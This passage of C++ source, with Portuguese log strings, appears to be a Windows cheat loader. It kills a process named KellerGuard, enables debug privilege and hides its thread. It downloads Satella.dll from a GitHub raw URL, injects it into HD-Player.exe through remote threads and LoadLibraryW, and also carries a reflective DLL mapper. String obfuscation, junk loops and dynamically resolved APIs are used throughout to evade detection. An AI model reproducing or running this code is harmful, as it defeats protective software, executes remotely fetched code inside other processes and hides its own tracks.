    if (!ReadProcessMemory(hProcess, (LPCVOID)(modBase + expDir->VirtualAddress), expBuf, expSize, &rd) || rd != expSize) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)expBuf;
    DWORD fc = exp->NumberOfFunctions;
    DWORD* funcRvas = (DWORD*)malloc(fc * sizeof(DWORD));
    if (!funcRvas) return 0;
    ULONGLONG result = 0;
    if (ReadProcessMemory(hProcess, (LPCVOID)(modBase + exp->AddressOfFunctions), funcRvas, fc * sizeof(DWORD), &rd)) {
        if (ordinal >= exp->Base && (ordinal - exp->Base) < fc) result = modBase + funcRvas[ordinal - exp->Base];
        else if (ordinal < fc) result = modBase + funcRvas[ordinal];
    }
    free(funcRvas);
    return result;
}

static ULONGLONG LoadRemoteModule(HANDLE hProcess, DWORD pid, const wchar_t* dllName) {
    ULONGLONG base = GetTargetModuleBase(pid, dllName);
    if (base) return base;
    // Not loaded — inject LoadLibraryW call
    size_t nameLen = (wcslen(dllName) + 1) * 2;
    void* mem = DynVirtualAllocEx(hProcess, NULL, (SIZE_T)nameLen + 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    DynWriteProcessMemory(hProcess, mem, dllName, nameLen, NULL);
    FARPROC pNtCTE = GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"ntdll.dll")), AY_OBFUSCATE("NtCreateThreadEx"));
    HANDLE hThread = NULL;
    if (pNtCTE) {
        ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,LPTHREAD_START_ROUTINE,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID))pNtCTE)(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("LoadLibraryW")), mem, 0x00000004, 0, 0, 0, NULL);
    }
    if (!hThread) {
        static auto _CreateRemoteThread = (decltype(&CreateRemoteThread))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("CreateRemoteThread"));
        if (_CreateRemoteThread) hThread = _CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("LoadLibraryW")), mem, 0, NULL);
    }
    if (hThread) { WaitForSingleObject(hThread, 5000); CloseHandle(hThread); }
    DynVirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    return GetTargetModuleBase(pid, dllName);
}

static BOOL ResolveImports(HANDLE hProcess, DWORD pid, BYTE* targetBase, BYTE* rawDll) {
    IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)rawDll;
    IMAGE_NT_HEADERS64* ntH = (IMAGE_NT_HEADERS64*)(rawDll + dosH->e_lfanew);
    IMAGE_DATA_DIRECTORY* impDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->Size == 0) { printf("[res] Sem imports\n"); return TRUE; }
    printf("[res] Import dir: VA=0x%X, Size=%lu\n", impDir->VirtualAddress, impDir->Size);
    DWORD impSz = impDir->Size;
    BYTE* impBuf = (BYTE*)malloc(impSz);
    if (!impBuf) { printf("[res] ERRO: malloc(%lu) falhou\n", impSz); return FALSE; }
    SIZE_T rd = 0;
    if (!ReadProcessMemory(hProcess, targetBase + impDir->VirtualAddress, impBuf, impSz, &rd) || rd != impSz) { printf("[res] ERRO: RPM import table falhou, gle=%lu\n", GetLastError()); free(impBuf); return FALSE; }
    IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)impBuf;
    int dllIdx = 0;
    while (imp->Name != 0) {
        char dllName[256] = {0};
        ReadProcessMemory(hProcess, targetBase + imp->Name, dllName, 255, NULL);
        printf("[res] DLL %d: %s (OriginalFirstThunk=0x%X, FirstThunk=0x%X)\n", dllIdx++, dllName, imp->OriginalFirstThunk, imp->FirstThunk);
        // Ensure the DLL is loaded in the target process
        wchar_t dllNameW[256];
        MultiByteToWideChar(CP_UTF8, 0, dllName, -1, dllNameW, 256);
        ULONGLONG modBase = 0;
        // Map api-ms-win-crt-* DLLs to ucrtbase.dll (forwarded exports)
        wchar_t* mappedName = dllNameW;
        if (_wcsnicmp(dllNameW, L"api-ms-win-crt", 14) == 0) {
            static wchar_t ucrt[] = L"ucrtbase.dll";
            // Check if ucrtbase is loaded in target
            modBase = GetTargetModuleBase(pid, ucrt);
            if (modBase) mappedName = ucrt;
        }
        if (!modBase) modBase = LoadRemoteModule(hProcess, pid, mappedName);
        if (!modBase) { printf("[res] ERRO: LoadRemoteModule(%s) falhou\n", dllName); free(impBuf); return FALSE; }
        printf("[res] %s carregado em 0x%llX\n", dllName, modBase);
        ULONGLONG* thunk = (ULONGLONG*)((BYTE*)targetBase + imp->FirstThunk);
        ULONGLONG* origThunk = imp->OriginalFirstThunk ? (ULONGLONG*)((BYTE*)targetBase + imp->OriginalFirstThunk) : thunk;
        for (int idx = 0; ; idx++) {
            ULONGLONG entry; SIZE_T er;
            ReadProcessMemory(hProcess, origThunk + idx, &entry, sizeof(entry), &er);
            if (er != sizeof(entry) || entry == 0) break;
            ULONGLONG funcAddr = 0;
            if (IMAGE_SNAP_BY_ORDINAL64(entry)) {
                WORD ordinal = (WORD)IMAGE_ORDINAL64(entry);
                // Local resolution first
                static auto _GetProcAddress = (decltype(&GetProcAddress))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("GetProcAddress"));
                HMODULE hMod = LoadLibraryA(dllName);
                if (hMod && _GetProcAddress) {
                    FARPROC localFunc = _GetProcAddress(hMod, (LPCSTR)(ULONG_PTR)ordinal);
                    if (localFunc) {
                        HMODULE hActual = NULL;
                        GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)localFunc, &hActual);
                        ULONGLONG actualBase = (ULONGLONG)(hActual ? hActual : hMod);
                        ULONGLONG rva = (ULONGLONG)localFunc - actualBase;
                        wchar_t modPath[MAX_PATH];
                        if (GetModuleFileNameW((HMODULE)actualBase, modPath, MAX_PATH)) {
                            wchar_t* fn = wcsrchr(modPath, L'\\');
                            fn = fn ? fn + 1 : modPath;
                            ULONGLONG tgtBase = GetTargetModuleBase(pid, fn);
                            if (tgtBase) funcAddr = tgtBase + rva;
                        }
                    }
                    FreeLibrary(hMod);
                }
                if (!funcAddr) funcAddr = ResolveApiAddrFromTargetOrd(hProcess, modBase, ordinal);
                if (!funcAddr) {
                    char ordName[32]; sprintf_s(ordName, "#%u", ordinal);
                    funcAddr = ResolveApiAddrViaRemoteThread(hProcess, dllName, ordName);
                }
                if (!funcAddr) printf("[res] ERRO: ResolveApiAddr ord(%s, #%u) falhou\n", dllName, ordinal);
            } else {
                // Name import: read the full hint+name (up to null terminator)
                ULONGLONG ibnAddr = (ULONGLONG)targetBase + (entry & 0x7FFFFFFF);
                WORD hint = 0;
                ReadProcessMemory(hProcess, (LPCVOID)ibnAddr, &hint, sizeof(hint), NULL);
                char funcName[256] = {0};
                SIZE_T nr;
                // Read up to 255 bytes of name starting after hint
                for (int ci = 0; ci < 255; ci++) {
                    if (!ReadProcessMemory(hProcess, (LPCVOID)(ibnAddr + 2 + ci), &funcName[ci], 1, &nr) || nr != 1) break;
                    if (funcName[ci] == 0) break;
                }
                // Try local → target export table → remote thread
                ULONGLONG localAddr = ResolveApiAddr(pid, dllName, funcName);
                if (localAddr) funcAddr = localAddr;
                else {
                    funcAddr = ResolveApiAddrFromTarget(hProcess, modBase, funcName);
                    if (!funcAddr) {
                        funcAddr = ResolveApiAddrViaRemoteThread(hProcess, dllName, funcName);
                    }
                }
                if (!funcAddr) printf("[res] ERRO: ResolveApiAddr(%s, %s) falhou (todos metodos)\n", dllName, funcName);
            }
            if (!funcAddr) { free(impBuf); return FALSE; }
            DynWriteProcessMemory(hProcess, thunk + idx, &funcAddr, sizeof(funcAddr), NULL);
        }
        imp++;
    }
    free(impBuf);
    return TRUE;
}

static BOOL ApplyRelocations(HANDLE hProcess, BYTE* targetBase, BYTE* rawDll, ULONGLONG delta) {
    if (delta == 0) return TRUE;
    IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)rawDll;
    IMAGE_NT_HEADERS64* ntH = (IMAGE_NT_HEADERS64*)(rawDll + dosH->e_lfanew);
    IMAGE_DATA_DIRECTORY* relocDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size == 0 || relocDir->VirtualAddress == 0) return TRUE;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(ntH);
    DWORD rawOff = 0;
    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        if (sec[i].VirtualAddress <= relocDir->VirtualAddress &&
            sec[i].VirtualAddress + sec[i].Misc.VirtualSize > relocDir->VirtualAddress) {
            rawOff = sec[i].PointerToRawData + (relocDir->VirtualAddress - sec[i].VirtualAddress);
            break;
        }
    }
    if (rawOff == 0) return TRUE;
    BYTE* relocData = rawDll + rawOff;
    IMAGE_BASE_RELOCATION* blk = (IMAGE_BASE_RELOCATION*)relocData;
    BYTE* end = relocData + relocDir->Size;
    while ((BYTE*)blk + sizeof(IMAGE_BASE_RELOCATION) <= end && blk->SizeOfBlock > 0) {
        DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* items = (WORD*)(blk + 1);
        for (DWORD i = 0; i < cnt; i++) {
            WORD type = items[i] >> 12;
            WORD off = items[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* addr = (ULONGLONG*)(targetBase + blk->VirtualAddress + off);
                ULONGLONG val; SIZE_T rr;
                ReadProcessMemory(hProcess, addr, &val, sizeof(val), &rr);
                if (rr == sizeof(val)) { val += delta; DynWriteProcessMemory(hProcess, addr, &val, sizeof(val), NULL); }
            }
        }
        blk = (IMAGE_BASE_RELOCATION*)((BYTE*)blk + blk->SizeOfBlock);
    }
    return TRUE;
}

static BYTE* InjectReflective(HANDLE hProcess, DWORD targetPid, const BYTE* rawDll, DWORD rawSize);

static ULONG FindExportRva(const BYTE* dllBytes, DWORD dllSize, const char* funcName) {
    if (!dllBytes || dllSize < 0x1000) return 0;
    IMAGE_DOS_HEADER dos; memcpy(&dos, dllBytes, sizeof(dos));
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt; memcpy(&nt, dllBytes + dos.e_lfanew, sizeof(nt));
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;
    IMAGE_DATA_DIRECTORY* expDir = &nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir->Size == 0 || expDir->VirtualAddress == 0) return 0;
    DWORD secOff = dos.e_lfanew + FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(dllBytes + secOff);
    DWORD rawOff = 0;
    for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        if (sec[i].VirtualAddress <= expDir->VirtualAddress &&
            sec[i].VirtualAddress + sec[i].Misc.VirtualSize > expDir->VirtualAddress) {
            rawOff = sec[i].PointerToRawData + (expDir->VirtualAddress - sec[i].VirtualAddress); break;
        }
    }
    if (!rawOff) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(dllBytes + rawOff);
    DWORD nameRva = exp->AddressOfNames, ordRva = exp->AddressOfNameOrdinals, funcRva = exp->AddressOfFunctions;
    DWORD nameRaw = 0, ordRaw = 0, funcRaw = 0;
    for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        if (sec[i].VirtualAddress <= nameRva && sec[i].VirtualAddress + sec[i].Misc.VirtualSize > nameRva)
            nameRaw = sec[i].PointerToRawData + (nameRva - sec[i].VirtualAddress);
        if (sec[i].VirtualAddress <= ordRva && sec[i].VirtualAddress + sec[i].Misc.VirtualSize > ordRva)
            ordRaw = sec[i].PointerToRawData + (ordRva - sec[i].VirtualAddress);
        if (sec[i].VirtualAddress <= funcRva && sec[i].VirtualAddress + sec[i].Misc.VirtualSize > funcRva)
            funcRaw = sec[i].PointerToRawData + (funcRva - sec[i].VirtualAddress);
    }
    if (!nameRaw || !ordRaw || !funcRaw) return 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        DWORD nameAddr; memcpy(&nameAddr, dllBytes + nameRaw + i * 4, 4);
        DWORD nameOff = 0;
        for (WORD si = 0; si < nt.FileHeader.NumberOfSections; si++) {
            if (sec[si].VirtualAddress <= nameAddr && sec[si].VirtualAddress + sec[si].Misc.VirtualSize > nameAddr) {
                nameOff = sec[si].PointerToRawData + (nameAddr - sec[si].VirtualAddress); break;
            }
        }
        if (!nameOff) continue;
        if (strcmp((const char*)dllBytes + nameOff, funcName) == 0) {
            WORD ord; memcpy(&ord, dllBytes + ordRaw + i * 2, 2);
            DWORD fRva; memcpy(&fRva, dllBytes + funcRaw + ord * 4, 4);
            return fRva;
        }
    }
    return 0;
}

static BYTE* InjectReflective(HANDLE hProcess, DWORD targetPid, const BYTE* rawDll, DWORD rawSize, BOOL callEntry = TRUE);
static BOOL CallEntryPoint(HANDLE hProcess, BYTE* imageBase, DWORD entryRva);

static BYTE* InjectReflective(HANDLE hProcess, DWORD targetPid, const BYTE* rawDll, DWORD rawSize, BOOL callEntry) {
    printf("[injr] InjectReflective: targetPid=%lu, rawSize=%lu, callEntry=%d\n", targetPid, rawSize, callEntry);
    IMAGE_DOS_HEADER dosH;
    if (rawSize < sizeof(dosH)) { printf("[injr] ERRO: rawSize < DOS header\n"); return NULL; }
    memcpy(&dosH, rawDll, sizeof(dosH));
    if (dosH.e_magic != IMAGE_DOS_SIGNATURE) { printf("[injr] ERRO: DOS signature invalida\n"); return NULL; }

    IMAGE_NT_HEADERS64 ntH;
    if (rawSize < (DWORD)dosH.e_lfanew + sizeof(ntH)) { printf("[injr] ERRO: rawSize < NT headers\n"); return NULL; }
    memcpy(&ntH, rawDll + dosH.e_lfanew, sizeof(ntH));
    if (ntH.Signature != IMAGE_NT_SIGNATURE) { printf("[injr] ERRO: NT signature invalida\n"); return NULL; }
    if (ntH.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) { printf("[injr] ERRO: Nao e x64\n"); return NULL; }

    printf("[injr] SizeOfImage=%lu, ImageBase=0x%llX, EntryPoint=0x%X\n",
        ntH.OptionalHeader.SizeOfImage, ntH.OptionalHeader.ImageBase, ntH.OptionalHeader.AddressOfEntryPoint);

    BYTE* imageBase = (BYTE*)DynVirtualAllocEx(hProcess, NULL, ntH.OptionalHeader.SizeOfImage,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) { printf("[injr] ERRO: VirtualAllocEx falhou, GetLastError=%lu\n", GetLastError()); return NULL; }
    printf("[injr] VirtualAllocEx OK: imageBase=0x%p\n", imageBase);

    ULONGLONG delta = (ULONGLONG)imageBase - ntH.OptionalHeader.ImageBase;
    printf("[injr] delta=0x%llX\n", delta);

    BOOL wpm = DynWriteProcessMemory(hProcess, imageBase, rawDll, ntH.OptionalHeader.SizeOfHeaders, NULL);
    if (!wpm) { printf("[injr] ERRO: WPM headers falhou, gle=%lu\n", GetLastError()); DynVirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE); return NULL; }
    printf("[injr] Headers escritos (%lu bytes)\n", ntH.OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(rawDll + dosH.e_lfanew + FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader) + ntH.FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < ntH.FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0 && sec[i].PointerToRawData > 0 && sec[i].PointerToRawData + sec[i].SizeOfRawData <= rawSize) {
            BOOL ws = DynWriteProcessMemory(hProcess, imageBase + sec[i].VirtualAddress, rawDll + sec[i].PointerToRawData, sec[i].SizeOfRawData, NULL);
            if (!ws) printf("[injr] AVISO: WPM secao %u falhou, gle=%lu\n", i, GetLastError());
            else printf("[injr] Secao %u escrita: VA=0x%X, %lu bytes\n", i, sec[i].VirtualAddress, sec[i].SizeOfRawData);
        } else printf("[injr] Secao %u ignorada (rawData=%lu, rawAddr=0x%X)\n", i, sec[i].SizeOfRawData, sec[i].PointerToRawData);
    }

    printf("[injr] Resolvendo imports...\n");
    if (!ResolveImports(hProcess, targetPid, imageBase, (BYTE*)rawDll)) {
        printf("[injr] ERRO: ResolveImports falhou\n");
        DynVirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return NULL;
    }
    printf("[injr] Imports resolvidos\n");

    printf("[injr] Aplicando relocations...\n");
    if (!ApplyRelocations(hProcess, imageBase, (BYTE*)rawDll, delta)) {
        printf("[injr] ERRO: ApplyRelocations falhou\n");
        DynVirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return NULL;
    }
    printf("[injr] Relocations aplicadas\n");

    if (callEntry) {
        if (!CallEntryPoint(hProcess, imageBase, ntH.OptionalHeader.AddressOfEntryPoint)) {
            printf("[injr] ERRO: CallEntryPoint falhou\n");
            DynVirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
            return NULL;
        }
    }
    printf("[injr] InjectReflective SUCESSO! (callEntry=%d)\n", callEntry);
    return imageBase;
}

static BOOL CallEntryPoint(HANDLE hProcess, BYTE* imageBase, DWORD entryRva) {
    // Nao executamos TLS callbacks manualmente aqui.
    // O entry point (DllMainCRTStartup) ja chama os TLS callbacks internamente.
    // Executar manualmente causa double-callback e crash (0xC0000005).

    BYTE stub[sizeof(g_ShellcodeStub)];
    memcpy(stub, g_ShellcodeStub, sizeof(stub));
    *(ULONGLONG*)&stub[2] = (ULONGLONG)imageBase;
    *(ULONGLONG*)&stub[24] = (ULONGLONG)(imageBase + entryRva);

    BYTE* stubRemote = (BYTE*)DynVirtualAllocEx(hProcess, NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stubRemote) { printf("[injr] ERRO: VirtualAllocEx stub falhou, gle=%lu\n", GetLastError()); return FALSE; }
    DynWriteProcessMemory(hProcess, stubRemote, stub, sizeof(stub), NULL);

    printf("[injr] Criando thread remota para DllMain...\n");
    HANDLE hThread = DynCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stubRemote, NULL, 0, NULL);
    if (!hThread) {
        DWORD gle = GetLastError();
        printf("[injr] ERRO: CreateRemoteThread falhou, gle=%lu\n", gle);
        DynVirtualFreeEx(hProcess, stubRemote, 0, MEM_RELEASE);
        DWORD exitCode = 0;
        if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
            printf("[injr] Processo alvo morreu (exitCode=%lu)\n", exitCode);
        }
        return FALSE;
    }
    printf("[injr] Thread criada, aguardando...\n");
    DWORD wr = WaitForSingleObject(hThread, 30000);
    if (wr == WAIT_FAILED) {
        printf("[injr] AVISO: WaitForSingleObject retornou WAIT_FAILED, gle=%lu\n", GetLastError());
    } else if (wr == WAIT_TIMEOUT) {
        printf("[injr] AVISO: WaitForSingleObject timeout (30s)\n");
        TerminateThread(hThread, 0);
    } else {
        printf("[injr] DllMain finalizado (wr=%lu)\n", wr);
    }
    CloseHandle(hThread);
    DynVirtualFreeEx(hProcess, stubRemote, 0, MEM_RELEASE);
    return TRUE;
}

static DWORD th_worker() {
    g_inj = 1; g_ok = 0; InvalidateRect(g_hwnd, NULL, TRUE);
    printf("[th] Iniciando injecao\n");
    strcpy(g_st, AY_OBFUSCATE("Eliminando KellerGuard...")); InvalidateRect(g_hwnd, NULL, TRUE);
    KillKellerGuard(); Sleep(500);
    KillKellerGuard();
    strcpy(g_st, "Preparando..."); InvalidateRect(g_hwnd, NULL, TRUE);
    EnableDebugPrivilege();
    HideThread();
    // Download Satella.dll do GitHub e salva em %temp%
    strcpy(g_st, "Baixando DLL..."); printf("[th] Baixando Satella.dll via WinHTTP\n");
    std::vector<BYTE> satellaData;
    { HINTERNET hSession = WinHttpOpen(AY_OBFUSCATE(L"Satella/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"raw.githubusercontent.com"), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, AY_OBFUSCATE(L"GET"), AY_OBFUSCATE(L"/semataryiscrazy/binallbossss/refs/heads/main/Satella.dll"), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
                    BYTE buf[4096]; DWORD read = 0;
                    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read > 0)
                        satellaData.insert(satellaData.end(), buf, buf + read);
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    } }
    if (satellaData.empty()) {
        printf("[th] ERRO: Download falhou (0 bytes)\n");
        strcpy(g_st, "Download falhou"); g_inj = 0; InvalidateRect(g_hwnd, NULL, TRUE); return 0;
    }
    printf("[th] Download OK: %zu bytes\n", satellaData.size());
    // Salvar em %temp%\Satella.dll
    wchar_t satPath[MAX_PATH];
    GetTempPathW(MAX_PATH, satPath);
    wcscat_s(satPath, L"Satella.dll");
    HANDLE hSatFile = CreateFileW(satPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if (hSatFile == INVALID_HANDLE_VALUE) {
        printf("[th] ERRO: nao pode criar temp file, gle=%lu\n", GetLastError());
        strcpy(g_st, "Erro temp file"); g_inj = 0; g_ok = 0; InvalidateRect(g_hwnd, NULL, TRUE); return 0;
    }
    DWORD written = 0;
    WriteFile(hSatFile, satellaData.data(), (DWORD)satellaData.size(), &written, NULL);
    CloseHandle(hSatFile);
    printf("[th] Satella salvo em: %S (%lu bytes)\n", satPath, written);
    // Resolve LoadLibraryW (endereco compartilhado entre processos no x64)
    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("LoadLibraryW"));
    // Encontrar HD-Player.exe
    static auto _CreateToolhelp32Snapshot_th = (decltype(&CreateToolhelp32Snapshot))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("CreateToolhelp32Snapshot"));
    static auto _Process32FirstW_th = (decltype(&Process32FirstW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("Process32FirstW"));
    static auto _Process32NextW_th = (decltype(&Process32NextW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("Process32NextW"));
    g_ok = 1; strcpy(g_st, "Injetando...");
    DWORD pids[32]; int pc = 0;
    HANDLE ss = _CreateToolhelp32Snapshot_th ? _CreateToolhelp32Snapshot_th(TH32CS_SNAPPROCESS, 0) : NULL;
    if (_Process32FirstW_th && _Process32NextW_th && ss != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {sizeof(pe)};
        if (_Process32FirstW_th(ss, &pe)) do {
            if (_wcsicmp(pe.szExeFile, AY_OBFUSCATE(L"HD-Player.exe")) == 0 && pc < 32) pids[pc++] = pe.th32ProcessID;
        } while (_Process32NextW_th(ss, &pe));
        CloseHandle(ss);
    }
    if (pc == 0) {
        strcpy(g_st, AY_OBFUSCATE("HD-Player nao encontrado")); g_inj = 0; g_ok = 0; InvalidateRect(g_hwnd, NULL, TRUE); return 0;
    }
    int success = 0;
    for (int pi = 0; pi < pc; pi++) {
        wchar_t msg[64]; wsprintfW(msg, AY_OBFUSCATE(L"Injetando [%d/%d]..."), pi + 1, pc);
        char mbuf[64]; wcstombs(mbuf, msg, 63); strcpy(g_st, mbuf);
        InvalidateRect(g_hwnd, NULL, TRUE);
        JUNK_LOOP();
        HANDLE hp = OpenProcessForInject(pids[pi]);
        if (!hp) { continue; }
        BYTE* dnsBase = NULL;
        (void)dnsBase;
        wchar_t* pathRemote = (wchar_t*)DynVirtualAllocEx(hp, NULL, (MAX_PATH + 1) * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pathRemote) { CloseHandle(hp); continue; }
        DynWriteProcessMemory(hp, pathRemote, satPath, (MAX_PATH + 1) * 2, NULL);
        OPAQUE_BRANCH(
            HANDLE hLoad = DynCreateRemoteThread(hp, NULL, 0, pLoadLib, pathRemote, 0, NULL);
            if (hLoad) {
                DWORD wr = WaitForSingleObject(hLoad, 30000);
                DWORD exitMod = 0;
                GetExitCodeThread(hLoad, &exitMod);
                CloseHandle(hLoad);
                if (wr == WAIT_OBJECT_0 && exitMod != 0) {
                    success++;
                } else {
                    DWORD exitProc = 0; GetExitCodeProcess(hp, &exitProc);
                    InvalidateRect(g_hwnd, NULL, TRUE); Sleep(1000);
                }
            }
        )
        DynVirtualFreeEx(hp, pathRemote, 0, MEM_RELEASE);
        CloseHandle(hp);
        Sleep(200);
    }
    // Deleta a DLL depois de injetar
    DeleteFileW(satPath);
    printf("[th] DLL deletada: %S\n", satPath);
    if (success) {
        wsprintfA(g_st, AY_OBFUSCATE("Injetado em %d processo(s)!"), success);
        g_inj = 0;
        InvalidateRect(g_hwnd, NULL, TRUE);
        Sleep(3000);
        g_ok = 0;
    } else {
        printf("[th] ERRO: Nenhuma injecao bem sucedida\n");
        strcpy(g_st, "Falha ao injetar");
        g_inj = 0;
        g_ok = 0;
    }
    InvalidateRect(g_hwnd, NULL, TRUE);
    return success > 0 ? 0 : 1;
}

DWORD WINAPI th(LPVOID p) {
    (void)p;
    __try { return th_worker(); }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        DWORD ec = GetExceptionCode();
        printf("[th] EXCEÇÃO: codigo=0x%08lX\n", ec);
        strcpy(g_st, "Erro na injecao"); g_inj = 0; InvalidateRect(g_hwnd, NULL, TRUE);
    }
    return 0;
}

LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE: rnd(); SetTimer(h, 1, 33, NULL); break;
    case WM_SIZE: g_cx = LOWORD(l); g_cy = HIWORD(l); break;
    case WM_CLOSE: UnloadDriver(); DestroyWindow(h); break;
    case WM_KEYDOWN:
        if (w == VK_ESCAPE) { UnloadDriver(); DestroyWindow(h); break; }
        if (g_log) break;
        do { wchar_t* tgt = NULL; int maxLen = 0;
        if (!g_reg) { tgt = (g_foc == 1) ? g_u : ((g_foc == 2) ? g_p : NULL); maxLen = 63; }
        else { tgt = (g_foc == 1) ? g_u : ((g_foc == 2) ? g_p : ((g_foc == 3) ? g_k : NULL)); maxLen = (g_foc == 3) ? 255 : 63; }
        if (!tgt) break;
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
            if (w == 'C' || w == 'c') {
                if (OpenClipboard(h)) { EmptyClipboard(); size_t sl = wcslen(tgt);
                    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (sl + 1) * 2);
                    if (hg) { memcpy(GlobalLock(hg), tgt, (sl + 1) * 2); GlobalUnlock(hg); SetClipboardData(CF_UNICODETEXT, hg); }
                    CloseClipboard(); }
                InvalidateRect(h, NULL, FALSE); break;
            }
            if (w == 'V' || w == 'v') {
                if (OpenClipboard(h)) { HANDLE hData = GetClipboardData(CF_UNICODETEXT);
                    if (hData) { wchar_t* clip = (wchar_t*)GlobalLock(hData);
                        if (clip) { size_t clen = wcslen(clip), tlen = wcslen(tgt);
                            size_t space = maxLen - tlen;
                            if (space > 0) { wcsncat(tgt, clip, space); tgt[tlen + space] = 0; } }
                        GlobalUnlock(hData); }
                    CloseClipboard(); }
                InvalidateRect(h, NULL, FALSE); break;
            }
            if (w == 'A' || w == 'a') {
                if (OpenClipboard(h)) { EmptyClipboard(); size_t sl = wcslen(tgt);
                    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (sl + 1) * 2);
                    if (hg) { memcpy(GlobalLock(hg), tgt, (sl + 1) * 2); GlobalUnlock(hg); SetClipboardData(CF_UNICODETEXT, hg); }
                    CloseClipboard(); }
                InvalidateRect(h, NULL, FALSE); break;
            }
        }
        } while(0);
        break;
    case WM_LBUTTONDBLCLK: return 0;
    case WM_NCHITTEST: {
        POINT pt; pt.x = (short)LOWORD(l); pt.y = (short)HIWORD(l);
        ScreenToClient(h, &pt);
        if (pt.y >= 0 && pt.y < 32) {
            if (pt.x >= g_cx - 38) return HTCLOSE;
            return HTCAPTION;
        }
        return HTCLIENT;
    }
    case WM_NCLBUTTONDOWN:
        if (w == HTCLOSE) { PostMessage(h, WM_CLOSE, 0, 0); return 0; }
        if (w == HTCAPTION) { PostMessage(h, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0); return 0; }
        break;
    case WM_DESTROY: PostQuitMessage(0); break;
    case WM_TIMER: {
